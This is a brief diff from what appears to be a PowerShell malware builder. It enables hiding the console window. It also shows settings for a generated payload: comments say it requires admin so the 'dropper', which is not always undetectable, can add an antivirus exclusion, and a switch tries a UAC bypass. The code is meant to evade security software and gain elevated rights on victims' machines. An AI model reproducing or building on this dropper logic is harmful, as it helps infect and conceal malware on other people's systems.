@@ -426,7 +426,7 @@ $var_OUTPUT_BOX.add_TextChanged({
 
 $var_OUTPUT_BOX.Text += "Successfully Started`n"
 Remove-Item -Path .\output\payload.ps1 -Force -ErrorAction SilentlyContinue
-#Hide-Console #Makes it look nice
+Hide-Console #Makes it look nice
 #If you don't want UAC admin to be required when running the payload set this to $false
 $uac_required = $true #This makes it so when they run the bat or ps1 file it requires them to run as admin. This is important because runtime the dropper sometimes won't be fud but this will add it as a exclusion.
 $uac_BYPASS = $false #If this is true then the generated script will try and bypass uac admin. If it is false then it will just require admin if $uac_required is true otherwise it will use normal script.
